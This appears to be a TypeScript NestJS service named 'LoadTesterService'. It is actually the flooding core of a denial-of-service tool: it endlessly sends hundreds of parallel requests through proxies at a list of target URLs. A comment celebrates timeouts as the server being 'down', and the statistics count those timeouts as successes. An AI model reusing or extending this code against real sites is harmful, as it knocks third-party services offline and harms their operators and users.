import { AxiosResponse } from 'axios';
import { lastValueFrom } from 'rxjs';
import { HttpService } from '@nestjs/axios';
import { ConsoleLogger, Injectable } from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Cron } from '@nestjs/schedule';
import { ApiClientService } from './api-client.service';
import { StatisticsService } from './statistics.service';

@Injectable()
export class LoadTesterService {
  /**
   * The service logger.
   */
  logger = new ConsoleLogger(this.constructor.name);

  /**
   * Defines how many requests may run in parallel.
   */
  concurrency: number;

  constructor(
    protected readonly axios: HttpService,
    protected readonly statistics: StatisticsService,
    protected readonly apiClient: ApiClientService,
    protected readonly configService: ConfigService,
  ) {
    this.concurrency = this.configService.get('app.concurrency', 500);
  }

  /**
   * Infinitely makes requests to target URLs.
   * @see bootstrap()
   */
  async infiniteLoop() {
    while (true) {
      // Collect promises into array.
      const allPromises = [...Array(this.concurrency).keys()].map(() =>
        lastValueFrom(this.axios.request(this.apiClient.prepareRandomRequestConfig())),
      );
      // Run promises and handle promise results.
      (await Promise.allSettled(allPromises)).forEach((promiseResult) => this.handleAxiosPromiseResults(promiseResult));
    }
  }

  /**
   * Handles Settled Promise Result and updates analytics.
   */
  handleAxiosPromiseResults(promiseResult: PromiseSettledResult<AxiosResponse>): void {
    const { value, reason } = promiseResult as any;
    const url = value?.config?.url || reason?.config?.url || 'unknown';
    switch (promiseResult.status) {
      case 'fulfilled':
        this.statistics.trackSuccess(url, value.status);
        break;
      case 'rejected':
        const { reason } = promiseResult;
        // If promise rejected because of timeout it means server is down, and we are happy.
        if (reason.code === 'ECONNABORTED') {
          this.statistics.trackTimeout(url, reason.message);
        } else {
          this.statistics.trackError(url, reason.response?.status, reason.message);
        }
        break;
    }
  }

  @Cron('*/30 * * * * *')
  async logGlobalStatistics() {
    const { logClear, logSummaryTable } = this.configService.get('app.logging');
    const [global, perSite] = await Promise.all([this.statistics.getStatsGlobal(), this.statistics.getStatsPerSite()]);

    if (logSummaryTable) {
      const tableData = Object.keys(perSite).map((url) => {
        return {
          url: url,
          success: perSite[url].success + perSite[url].timeout,
          errors: perSite[url].error,
        };
      });
      if (tableData.length) {
        if (logClear) console.clear();
        tableData.push({ url: 'Total:', success: global.success + global.timeout, errors: global.error });
        console.table(tableData);
      }
    }

    const status = await this.getStatus();
    delete status.currentTargets;
    this.logger.log(JSON.stringify(status));
  }

  /**
   * Returns load testing status. Used in controller.
   */
  async getStatus() {
    const { success, timeout, error } = await this.statistics.getStatsGlobal();
    return {
      hardware: await this.statistics.getHardwareStatus(),
      stats: {
        success: success + timeout,
        errors: error,
      },
      proxiesLoaded: this.apiClient.axiosProxies.length,
      currentTargets: Array.from(this.apiClient.urls),
    };
  }
}